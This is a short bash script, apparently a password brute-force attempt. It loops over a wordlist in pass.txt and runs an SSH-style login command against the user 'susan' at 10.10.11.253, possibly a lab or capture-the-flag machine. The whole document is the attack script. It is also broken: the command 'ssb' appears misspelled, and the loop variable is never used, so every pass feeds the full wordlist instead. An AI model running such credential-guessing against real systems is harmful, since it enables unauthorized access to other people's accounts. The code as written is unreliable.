#!/bin/bash

for password in $(cat pass.txt); do
    echo "trying $password"
    ssb -p 22 -w pass.txt susan@10.10.11.253
done